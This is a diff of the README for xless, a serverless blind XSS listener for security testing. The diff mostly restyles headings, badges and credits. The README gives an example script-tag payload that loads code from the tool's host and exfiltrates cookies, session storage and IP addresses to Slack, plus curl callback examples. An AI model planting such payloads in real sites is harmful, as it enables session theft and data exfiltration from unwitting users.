@@ -1,21 +1,31 @@
-XLESS
-======
+<h1 align="center">
+  <br>
+  <a href="https://github.com/mazen160/xless"><img src="https://user-images.githubusercontent.com/29874489/58731472-4f6c8080-83de-11e9-8206-992f4d777fdc.png" alt="Xless"></a>
+  <br>
+  xless
+  <br>
+</h1>
 
-# The Serverless Blind XSS App
+<h4 align="center">The Serverless Blind XSS App</h4>
+  
+<p align="center">
+  <img src="https://img.shields.io/maintenance/yes/2019.svg?style=flat-square" alt="Maintained" /> 
+  <img src="https://img.shields.io/bitbucket/issues-raw/mazen160/xless.svg?style=flat-square" alt="Issues" />
+  <img src="https://img.shields.io/github/last-commit/mazen160/xless.svg?style=flat-square" alt="Last Commit" />
+</p>
 
-## About The Project
-xless is a serverless blind XSS app that can be used to identify blind XSS vulnerabilities using your own deployed version of the app. There is no need to run a full deployment process; just setup a zeit.co account and run `bash deploy.sh`. That's it. You have a fully-running Blind XSS listener that uses Slack to notify you for blind XSS callbacks.
+## :information_source: About The Project
+**Xless** is a serverless Blind XSS (bXSS) application that can be used to identify Blind XSS vulnerabilities using your own deployed version of the application.  
+There is no need to run a full deployment process; just setup a [zeit.co](https://zeit.co/) account and run `bash deploy.sh`.
+That's it. You now have a fully-running Blind XSS listener that uses Slack to notify you for callbacks.
 
-
-## Requirements
-
-* zeit.co account: Zeit provides free plan for serverless. If you use another provider for serverless, code changes should be minimal.
+## :warning: Requirements
+* [zeit.co](https://zeit.co/) account: zeit provides a **free plan** for serverless. If you use another provider for serverless, code changes should be minimal.
 * Slack Incoming Webhook URL.
 
 
-## Deployment
-
-1. Run:
+## :rocket: Deployment
+1. Run `bash deploy.sh`
 
 ```bash
 $ bash deploy.sh
@@ -29,18 +39,18 @@ $ bash deploy.sh
 **Xless will automatically serve the XSS payload, collect information, and exfiltrate it into your serverless app, which is then sent right to you in Slack.**
 
 
-## Example Payload
+## :speech_balloon: Example Payload
 
-```javascript
+```html
 <script src="https://xless.now.sh"></script>
 ```
 
 
-## Demo
+## :eyes: Demo
 ![Demo](https://raw.githubusercontent.com/mazen160/public/master/static/images/xless-screenshot.png)
 
 
-# Collected Data
+## :incoming_envelope: Collected Data
 
 * Cookies
 * User-Agent
@@ -53,12 +63,11 @@ $ bash deploy.sh
 * SessionStorage
 * IP Address
 
-
-# Out-of-Band Callbacks Listener
+## :satellite: Out-of-Band (OOB) Callbacks Listener
 
 Xless also works as an OOB (Out-of-Band) callbacks listener for HTTP/HTTPS requests. Any HTTP GET request that is sent to non-parent path will be alerted.
 
-### Demo
+## :eyes: Demo
 
 ```bash
 $ curl https://xless.now.sh/callback-canary
@@ -73,9 +82,9 @@ $ curl https://xless.now.sh/88bf0ecd
 ```
 
 
-# Example Blind XSS payloads
+##  Example Blind XSS payloads
 
-You can view a number of handy XSS payloads for your Xless app at `/examples`
+You can view a number of handy XSS payloads for your xless app at `$URL/examples`
 * URL: `https://xless.now.sh/examples`
 Once you deploy your app, you can find the examples there.
 
@@ -85,15 +94,15 @@ Contribution is very welcome. Please share your ideas by Github issues and pull 
 
 Here are some ideas to start with:
 1. Enabling sharing of page screenshot - Check `test.payload.js`.
-2. A nice logo design!
-3. _Your idea of a new feature_?
+2. _Your idea of a new feature_?
 
 
 ## Acknowledgement
 
-* Matthew Bryant (https://github.com/mandatoryprogrammer) for the XSS Hunter project.
-* Rami Ahmed (https://twitter.com/rami_ahmad) for the "xless" name idea.
-* Zeit.co for operating a great serverless platform.
+* [Matthew Bryant](https://github.com/mandatoryprogrammer) for the XSS Hunter project.
+* [Rami Ahmed](https://twitter.com/rami_ahmad) for the "xless" name idea.
+* [Damian Ebelties](https://twitter.com/DamianEbelties) for the logo.
+* [Zeit.co](https://zeit.co/) for operating a great serverless platform.
 
 
 ## Legal Disclaimer
@@ -106,6 +115,6 @@ The project is currently licensed under MIT License.
 ## Author
 *Mazin Ahmed*
 * Website: [https://mazinahmed.net](https://mazinahmed.net)
-* Email: *mazin AT mazinahmed DOT net*
+* Email: mazin [at] mazinahmed [dot] net
 * Twitter: [https://twitter.com/mazen160](https://twitter.com/mazen160)
 * Linkedin: [http://linkedin.com/in/infosecmazinahmed](http://linkedin.com/in/infosecmazinahmed)
